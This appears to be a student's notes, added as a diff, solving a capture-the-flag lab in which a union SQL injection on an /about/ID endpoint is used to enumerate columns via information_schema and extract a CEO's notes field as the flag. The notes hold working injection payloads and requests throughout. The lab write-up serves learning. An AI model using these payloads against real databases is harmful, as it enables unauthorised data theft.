@@ -1,0 +1,37 @@
+[06/20/2024]
+### Extra-mile challenge notes
+# identify and exploit a Union SQL Injection vulnerability present in the ID parameter of the /about/ID endpoint, launch an attack to retrieve the notes about the CEO stored in the database.
+
+# Deduced SQL query:
+SELECT * FROM *tablename* WHERE id=2 LIMIT 1;
+
+
+--------------------------------------------------
+# Exploitation plan:
+1. Generate an error message to get info about the DB:
+GET /about/2' HTTP/1.1
+
+Error returned:
+Invalid statement: <code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'
+
+Deduced SQL query:
+SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2
+
+
+---
+2. We know that we need 5 columns to launch a UNION SQL attack:
+0 UNION SELECT 1,2,3,4,5
+
+#id=1 is used as we found out that that's the page for the CEO. However, we set it to 0 to generate a non-legit request so that the response to the 2nd half of the UNION may be displayed instead.
+
+#We want to know what columns are inside the TABLE people. Will there be a memo?
+0 UNION SELECT group_concat(column_name),2,3,4,5 FROM information_schema.columns WHERE table_name="people"
+
+# We see that the columns are: id,firstName,lastName,pfpLink,role,shortRole,bio,notes, and NOTES may be what we want to look at.
+
+
+---
+3. Query the notes attribute from the CEO (id=1)
+0 UNION SELECT firstName,lastName,pfpLink,bio,notes from people where id=1
+
+And the above gives us the flag THM{ZG...Jh}
